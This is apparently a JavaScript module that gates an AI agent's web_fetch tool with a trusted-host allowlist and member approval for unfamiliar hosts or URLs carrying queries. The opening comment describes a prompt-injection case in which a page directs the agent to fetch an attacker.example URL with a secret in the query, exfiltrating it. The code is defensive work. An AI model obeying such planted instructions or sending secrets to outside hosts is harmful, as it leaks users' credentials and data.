// web_fetch is a request to any public https address: a page that tells the agent to fetch
// https://attacker.example/?d=<secret> sends that secret out. Documentation and package registries are
// read freely. Another host is asked about once per conversation; an address with a query or a fragment
// (where data rides along) is asked about every time. Bypass asks only about the latter. A helper cannot
// ask the member: it is told to hand the address to the main agent.
const TRUSTED = ['github.com', 'raw.githubusercontent.com', 'docs.github.com', 'npmjs.com', 'www.npmjs.com', 'registry.npmjs.org', 'pypi.org',
  'docs.python.org', 'developer.mozilla.org', 'nodejs.org', 'go.dev', 'pkg.go.dev', 'crates.io', 'docs.rs', 'doc.rust-lang.org', 'learn.microsoft.com',
  'developer.apple.com', 'docs.oracle.com', 'maven.apache.org', 'central.sonatype.com', 'kotlinlang.org', 'typescriptlang.org', 'www.typescriptlang.org',
  'react.dev', 'nextjs.org', 'vite.dev', 'vitejs.dev', 'docs.docker.com', 'kubernetes.io', 'stackoverflow.com', 'en.wikipedia.org', 'vi.wikipedia.org',
  'playwright.dev', 'docs.spring.io', 'spring.io'];
export const trustedHost = host => TRUSTED.includes(String(host).toLowerCase().replace(/\.$/, ''));

// null: fetch it; 'ask': the member approves first; 'refuse': a helper's fetch the member would have to approve.
export function fetchDecision({ known = new Set(), onlyHandoff = false }, role, raw) {
  let url;
  try { url = new URL(raw); } catch { return null; } // web_fetch refuses it on its own
  const host = url.hostname.toLowerCase();
  if (trustedHost(host)) return null;
  const carries = Boolean(url.search || url.hash), seen = known.has(host);
  if (role !== 'main') return carries || !seen ? 'refuse' : null;
  if (onlyHandoff) return carries ? 'ask' : null;
  return carries || !seen ? 'ask' : null;
}

// `owner`: { permission, approvals, hosts: Set }. `ask` shows the card (ctx.ui.confirm through Approvals).
export async function guardFetch(owner, role, raw, ctx, signal) {
  const decision = fetchDecision({ known: owner.hosts, onlyHandoff: owner.permission.asksOnlyHandoff }, role, raw);
  if (decision === 'refuse') {
    throw Error(`managed-web-fetch-needs-member: ${raw} is not a documentation site the helper may read on its own. `
      + 'Name the address in your answer; the main agent asks the member before it is read.');
  }
  if (decision !== 'ask') return;
  await owner.approvals.request(ctx, { key: `web_fetch ${raw}`, title: 'Đọc trang web lạ',
    body: `${raw}\n\nTrang này không thuộc nhóm trang tài liệu quen thuộc. Địa chỉ (kể cả phần sau dấu ?) sẽ được gửi tới trang đó.\n\n`
      + 'Đồng ý: đọc trang này một lần (GET, không cookie, không thông tin đăng nhập).\nTừ chối: không đọc, agent được báo bạn đã từ chối.' }, signal);
  const url = new URL(raw);
  if (!url.search && !url.hash) owner.hosts.add(url.hostname.toLowerCase());
}
